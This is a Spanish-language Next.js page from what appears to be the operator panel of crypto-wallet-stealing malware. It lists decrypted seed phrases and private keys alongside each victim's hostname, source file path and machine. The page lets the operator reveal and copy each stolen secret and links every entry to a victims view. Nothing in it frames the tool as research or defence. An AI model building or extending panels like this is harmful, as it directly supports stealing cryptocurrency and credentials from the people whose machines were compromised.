'use client';
import Link from 'next/link';
import { useMemo, useState } from 'react';
import { copy } from '@/lib/format';
import { toast } from 'sonner';
import { Copy, KeyRound, Search, Sprout } from 'lucide-react';
import { api, ApiError } from '@/lib/api';
import { useApi } from '@/hooks/useApi';
import { Topbar } from '@/components/topbar';
import { Card } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Empty, ErrorState, SkeletonRows, Table, TD, TH, THead, TR } from '@/components/ui/table';
import { dateTime } from '@/lib/format';
import type { VaultSecretRow } from '@/lib/types';
import { VaultDrawer } from '@/components/vault-drawer';

type Mode = 'seed' | 'private_key';

const KIND_LABEL: Record<string, string> = { seed: 'semilla', seed_file: 'fichero de semillas', private_key: 'clave privada', keystore: 'keystore' };

export default function SeedsPage() {
  const [mode, setMode] = useState<Mode>('seed');
  const [q, setQ] = useState('');
  const [wallet, setWallet] = useState<string | null>(null);
  const query = useMemo(() => {
    const params = new URLSearchParams({ kind: mode, limit: '200' });
    if (q.trim()) params.set('q', q.trim());
    return params.toString();
  }, [mode, q]);
  const { data, loading, error, refresh } = useApi<{ items: VaultSecretRow[] }>(`/vault/secrets?${query}`, { pollMs: 20_000 });

  async function copyRow(row: VaultSecretRow) {
    try {
      const result = await api<{ value: string }>(`/vault/wallets/${row.wallet.id}/reveal?secretId=${row.id}&kind=${row.kind}`);
      copy(result.value);
      toast.success('Copiado');
    } catch (caught) {
      toast.error(caught instanceof ApiError ? caught.message : 'No se pudo revelar');
    }
  }

  return (
    <>
      <Topbar title="Semillas y claves" subtitle="Material descifrado, con su fichero y equipo de origen" />
      <div className="space-y-2 pt-3">
        <div className="flex flex-wrap items-center gap-2">
          <button className="chip" data-active={mode === 'seed'} onClick={() => setMode('seed')}><Sprout className="h-3 w-3" /> semillas</button>
          <button className="chip" data-active={mode === 'private_key'} onClick={() => setMode('private_key')}><KeyRound className="h-3 w-3" /> claves privadas</button>
          <div className="relative ml-auto w-full max-w-[380px]">
            <Search className="absolute left-2 top-2 h-3.5 w-3.5 text-muted" />
            <Input value={q} onChange={(event) => setQ(event.target.value)} placeholder="target, ruta o equipo" className="pl-7" aria-label="Buscar material" />
          </div>
          <Button size="sm" variant="secondary" onClick={refresh}>refrescar</Button>
        </div>

        <Card>
          {loading && !data ? <SkeletonRows rows={8} cols={5} /> : error && !data ? <ErrorState message={error.message} retry={refresh} /> : (data?.items ?? []).length === 0 ? (
            <Empty
              title={mode === 'seed' ? 'Sin semillas' : 'Sin claves privadas'}
              hint="El material aparece aquí cuando un escaneo descifra un vault o encuentra un fichero de semillas."
            />
          ) : (
            <Table>
              <THead><TR><TH>Tipo</TH><TH>Valor</TH><TH className="hidden lg:table-cell">Origen</TH><TH className="hidden sm:table-cell">Equipo</TH><TH className="hidden sm:table-cell">Visto</TH><TH><span className="sr-only">Acciones</span></TH></TR></THead>
              <tbody>
                {(data!.items).map((row) => (
                  <TR key={row.id}>
                    <TD><Badge tone={row.kind === 'seed' ? 'ok' : row.kind === 'seed_file' ? 'warn' : 'brand'}>{KIND_LABEL[row.kind] ?? row.kind}</Badge>{row.words ? <span className="ml-1 text-2xs text-muted">{row.words} palabras</span> : null}</TD>
                    <TD className="max-w-[150px] truncate font-mono text-xs sm:max-w-[360px]" title={row.preview}>{row.kind === 'seed_file' ? row.wallet.targetId : row.preview}</TD>
                    <TD className="hidden max-w-[320px] truncate font-mono text-2xs text-muted lg:table-cell" title={row.wallet.path}>{row.wallet.targetId} · {row.wallet.path}</TD>
                    <TD className="hidden sm:table-cell"><Link className="font-mono text-brand" href={`/victims?select=${row.victim.id}&tab=boveda`}>{row.victim.hostname}</Link></TD>
                    <TD className="hidden num text-2xs text-muted sm:table-cell">{dateTime(row.updatedAt)}</TD>
                    <TD className="whitespace-nowrap">
                      <div className="flex justify-end gap-1">
                      <Button size="sm" variant="ghost" onClick={() => void copyRow(row)} title="Revelar y copiar"><Copy className="h-3 w-3" /></Button>
                      <Button size="sm" variant="ghost" onClick={() => setWallet(row.wallet.id)}>abrir</Button>
                      </div>
                    </TD>
                  </TR>
                ))}
              </tbody>
            </Table>
          )}
        </Card>
        <p className="text-2xs text-muted">Se muestran hasta 200 entradas. Usa el buscador para acotar; los valores se revelan contra la bóveda y quedan auditados.</p>
      </div>
      <VaultDrawer walletId={wallet} onClose={() => setWallet(null)} />
    </>
  );
}
